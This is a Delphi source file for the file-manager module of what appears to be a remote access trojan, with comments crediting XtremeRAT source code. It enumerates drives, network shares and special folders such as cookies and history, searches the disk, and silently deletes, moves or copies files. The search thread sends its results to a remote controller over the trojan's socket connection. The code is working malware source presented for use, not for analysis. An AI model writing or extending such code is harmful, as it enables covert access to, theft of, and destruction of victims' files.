unit UnitFilesManager;

interface
                                    
uses
  Windows, ShellAPI, ShlObj, UnitConstants, UnitVariables, UnitFunctions, StreamUnit,
  UnitCommands, SocketUnitEx;
    
type
	PSearchOptions = ^TSearchOptions;
  TSearchOptions = record
		StartDir, FileMask: string;
    SubDir: Boolean; 
  end;

var
  SearchOptions: TSearchOptions;
  StopSearching: Boolean;

function DeleteAllFilesAndDir(FilesOrDir: string; Bin: Boolean = False): Boolean;
function ListDirectory(Path: string): string;
function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
function ListSpecialFolders: string;                                    
function ListDrives: string; 
function ListSharedFolders: string;    
procedure SearchFileThread(p: Pointer); stdcall;
function _SetFileAttributes(FilePath, Attributes: string): Boolean;
function MoveFileToBin(Filename: string): Boolean;

implementation
              
const
  CSIDL_APPDATA = $001A;
  CSIDL_BITBUCKET = $000A;
  CSIDL_COMMON_APPDATA = $0023;
  CSIDL_COMMON_DESKTOPDIRECTORY = $0019;
  CSIDL_COMMON_DOCUMENTS = $002E;
  CSIDL_COMMON_FAVORITES = $001F;
  CSIDL_COMMON_MUSIC = $0035;
  CSIDL_COMMON_PICTURES = $0036;
  CSIDL_COMMON_PROGRAMS = $0017;
  CSIDL_COMMON_STARTMENU = $0016;
  CSIDL_COMMON_STARTUP = $0018;
  CSIDL_COMMON_VIDEO = $0037;
  CSIDL_CONTROLS = $0003;
  CSIDL_COOKIES = $0021;
  CSIDL_DESKTOP = $0000;
  CSIDL_DESKTOPDIRECTORY = $0010;
  CSIDL_FAVORITES = $0006;
  CSIDL_FONTS  = $0014;
  CSIDL_HISTORY = $0022;
  CSIDL_INTERNET = $0001;
  CSIDL_INTERNET_CACHE = $0020;
  CSIDL_LOCAL_APPDATA = $001C;
  CSIDL_MYMUSIC = $000D;
  CSIDL_MYVIDEO = $000E;
  CSIDL_NETHOOD = $0013;
  CSIDL_PERSONAL = $0005;
  CSIDL_PRINTERS = $0004;
  CSIDL_PRINTHOOD = $001B;
  CSIDL_PROGRAM_FILES = $0026;
  CSIDL_PROGRAMS = $0002;
  CSIDL_RECENT = $0008;
  CSIDL_SENDTO = $0009;
  CSIDL_STARTMENU = $000B;
  CSIDL_STARTUP = $0007;
  CSIDL_SYSTEM = $0025;
  CSIDL_WINDOWS = $0024;

var
  SearchResults: string;

function _SetFileAttributes(FilePath, Attributes: string): Boolean;
var
  Attr: Cardinal;
begin
  if Pos('A', Attributes) > 0 then SetFileAttributes(PChar(FilePath), faArchive) else
  if Pos('D', Attributes) > 0 then SetFileAttributes(PChar(FilePath), faDirectory);

  Attr := GetFileAttributes(PChar(FilePath));
  if Pos('H', Attributes) > 0 then Attr := Attr or faHidden;
  if pos('R', Attributes) > 0 then Attr := Attr or faReadOnly;
  if pos('S', Attributes) > 0 then Attr := Attr or faSysFile;
  
  Result := SetFileAttributes(PChar(FilePath), Attr);
end;

//From XtremeRAT 3.6 source code
function ListSpecialFolders: string;
const
  SpecialsFolders: array[0..35] of Integer = (CSIDL_DESKTOP, CSIDL_INTERNET, CSIDL_PROGRAMS,
    CSIDL_CONTROLS, CSIDL_PRINTERS, CSIDL_PERSONAL, CSIDL_FAVORITES, CSIDL_STARTUP, CSIDL_RECENT,
    CSIDL_SENDTO, CSIDL_BITBUCKET, CSIDL_STARTMENU, CSIDL_MYMUSIC, CSIDL_MYVIDEO, CSIDL_DESKTOPDIRECTORY,
    CSIDL_NETHOOD, CSIDL_FONTS, CSIDL_COMMON_STARTMENU, CSIDL_COMMON_PROGRAMS, CSIDL_COMMON_STARTUP,
    CSIDL_COMMON_DESKTOPDIRECTORY, CSIDL_APPDATA, CSIDL_PRINTHOOD, CSIDL_LOCAL_APPDATA,
    CSIDL_COMMON_APPDATA, CSIDL_WINDOWS, CSIDL_SYSTEM, CSIDL_PROGRAM_FILES, CSIDL_COMMON_DOCUMENTS,
    CSIDL_COMMON_MUSIC, CSIDL_COMMON_PICTURES, CSIDL_COMMON_VIDEO, CSIDL_COMMON_FAVORITES,
    CSIDL_INTERNET_CACHE, CSIDL_COOKIES, CSIDL_HISTORY);
var
  i: Integer;
  TmpStr: string;
begin
  for i := 0 to 35 do
  begin
    TmpStr := GetSpecialFolder(SpecialsFolders[i]);
    if TmpStr <> '' then Result := Result + TmpStr + '|';
  end;
end;

function MyGetDiskSize(Drive: PChar; var FreeAvailable, TotalSpace: TLargeInteger): Boolean;
var
  SectorsPerCluster, BytesPerSector, FreeClusters, TotalClusters: LongWord;
  i: Int64;
begin
  Result := GetDiskFreeSpaceA(Drive, SectorsPerCluster, BytesPerSector,
    FreeClusters, TotalClusters);
  i := SectorsPerCluster * BytesPerSector;
  FreeAvailable := i * FreeClusters;
  TotalSpace := i * TotalClusters;
end;

function ListDrives: string;
var
  pDrive: PChar;
  dName, dAttrib: array[0..MAX_PATH] of Char;     
  UsedSize, TotalSize: Int64;
  MaxPath, Flags: DWORD;
begin
  GetMem(pDrive, 512);
  GetLogicalDriveStrings(512, pDrive);
  
  while pDrive^ <> #0 do
  begin
    FillChar(dName, SizeOf(dName), 0);
    FillChar(dAttrib, SizeOf(dAttrib), 0);
    GetVolumeInformation(pDrive, dName, SizeOf(dName), nil, MaxPath, Flags, dAttrib, SizeOf(dAttrib));
    if dName = '' then dName := 'Unknown';
    MyGetDiskSize(pDrive, UsedSize, Totalsize);
    
    Result := Result + pDrive + '|' + IntToStr(GetDriveType(pDrive)) + '|' + dName + '|' +
      dAttrib + '|' + IntToStr(TotalSize) + '|' + IntToStr(UsedSize) + '|' + #13#10;

    Inc(pDrive, 4);
  end;
end;

function EnumFuncLAN(NetResource: PNetResource): string;
var
  Enum: THandle;
  Count, BufferSize: DWORD;
  Buffer: array[0..16384 div SizeOf(TNetResource)] of TNetResource;
  i: Integer;
begin
  Result := '';
  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, Enum) = NO_ERROR then
  try
    Count := $FFFFFFFF;
    BufferSize := SizeOf(Buffer);
    while WNetEnumResource(Enum, Count, @Buffer, BufferSize) = NO_ERROR do
    for i := 0 to Count - 1 do
    begin
      if Buffer[i].dwType = RESOURCETYPE_DISK then
        Result := Result + Buffer[i].lpRemoteName + '|';
      if (Buffer[i].dwUsage and RESOURCEUSAGE_CONTAINER) > 0 then
        Result := Result + EnumFuncLan(@Buffer[i]);
    end;
  finally
    WNetCloseEnum(Enum);
  end;
end;

function ListSharedFolders: string;
begin
  Result := EnumFuncLAN(nil);
end;

//Simple way to get files list, by wrh1d3 :)
function ListDirectory(Path: string): string;
var
  FindData: TWin32FindData;
  hFind: THandle;
  DirStream: TMemoryStream;
begin
  if Path = '' then Exit;
  DirStream := TMemoryStream.Create;
  if Path[Length(Path)] <> '\' then Path := Path + '\';
  hFind := FindFirstFile(PChar(Path + '*.*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then Exit;
  DirStream.Write(FindData, SizeOf(TWin32FindData));
  while FindNextFile(hFind, FindData) do
  DirStream.Write(FindData, SizeOf(TWin32FindData));
  Windows.FindClose(hFind);

  DirStream.Position := 0;
  SetLength(Result, DirStream.Size);
  DirStream.Read(Pointer(Result)^, Length(Result));
  DirStream.Free;
end;

procedure SearchFiles(StartDir, FileMask: string; SubDir: Boolean);
var
  sRec: TSearchRec;
  Path: string;
begin
  if StopSearching then Exit;
  Path := StartDir;
  if Path[length(Path)] <> '\' then Path := Path + '\';
  if FindFirst(Path + FileMask, faAnyFile - faDirectory, sRec) = 0 then
  try
    repeat
      if StopSearching then Break;
      SearchResults := SearchResults + Path + sRec.Name + '|' +
        IntToStr(MyGetFileSize(Path + sRec.Name)) + '|' + #13#10;
    until FindNext(sRec) <> 0;
  finally
    FindClose(sRec);
  end;
  
  if not SubDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, sRec) = 0 then 
  try
    repeat
      if ((sRec.Attr and faDirectory) <> 0) and (sRec.Name <> '.') and (sRec.Name <> '..') then
        SearchFiles(Path + sRec.Name, FileMask, True);
    until FindNext(sRec) <> 0;
  finally
    FindClose(sRec);
  end;
end;
       
function MySHFileOperation(const lpFileOp: TSHFileOpStruct): Integer;
var
  xSHFileOperation: function(const lpFileOp: TSHFileOpStruct): Integer; stdcall;
begin
  xSHFileOperation := GetProcAddress(LoadLibrary(pchar('shell32.dll')), pchar('SHFileOperationA'));
  Result := xSHFileOperation(lpFileOp);
end;

function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
var
  OpStruc: TSHFileOpStruct;
  frombuf, tobuf: Array [0..128] of Char;
begin
  Result := false;
  FillChar( frombuf, Sizeof(frombuf), 0 );
  FillChar( tobuf, Sizeof(tobuf), 0 );
  StrPCopy( frombuf,  SourcePath);
  StrPCopy( tobuf,  DestPath);

  with OpStruc dO
  begin
    Wnd := Hwd;
    wFunc := FO_COPY;
    pFrom := @frombuf;
    pTo :=@tobuf;
    fFlags := FOF_NOCONFIRMATION or FOF_RENAMEONCOLLISION;
    fAnyOperationsAborted:= False;
    hNameMappings:= Nil;
    lpszProgressTitle:= Nil;
  end;

  if myShFileOperation(OpStruc) = 0 then Result := true;
end;
           
function DeleteAllFilesAndDir(FilesOrDir: string; Bin: Boolean): boolean;
var
  F: TSHFileOpStruct;
  From: string;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := PChar(From);
    F.pTo := nil;
    F.fFlags := F.fFlags or FOF_NOCONFIRMATION  or FOF_SIMPLEPROGRESS or FOF_FILESONLY or FOF_NOERRORUI;
    if Bin = True then f.fFlags := f.fFlags or FOF_ALLOWUNDO;
    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := MyShFileOperation(F);
    Result := (ResultVal = 0);
  finally
  end;
end;
     
function MoveFileToBin(Filename: string): Boolean;
var
  F: SHFileOpStruct;
  I: Integer;
begin
  FillChar(F, SizeOf(F), 0);
  F.Wnd := 0;
  F.wFunc := FO_DELETE;
  F.pFrom := PChar(Filename);
  F.fFlags := F.fFlags or FOF_NOCONFIRMATION or FOF_SIMPLEPROGRESS or FOF_NOERRORUI or FOF_ALLOWUNDO;
  I := MySHFileOperation(F);
  Result := (I = 0);
end;

function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
begin
  if oldPath = NewPath then Result := False else
    Result := MoveFile(pchar(OldPath), pchar(NewPath));
end;

//Thanks to XtreameRAT coder, easy way to send search results
procedure SearchFileThread(p: Pointer); stdcall; 
begin
  StopSearching := True;
  Sleep(100);
  StopSearching := False;
  SearchResults := '';
  SearchFiles(PSearchOptions(p)^.StartDir, PSearchOptions(p)^.FileMask, PSearchOptions(p)^.SubDir);
  StopSearching := True;
  MainConnection.SendDatas(FILESMANAGER + '|' + FILESSEARCHRESULTS + '|' + SearchResults);
  SearchResults := '';
end;

end.
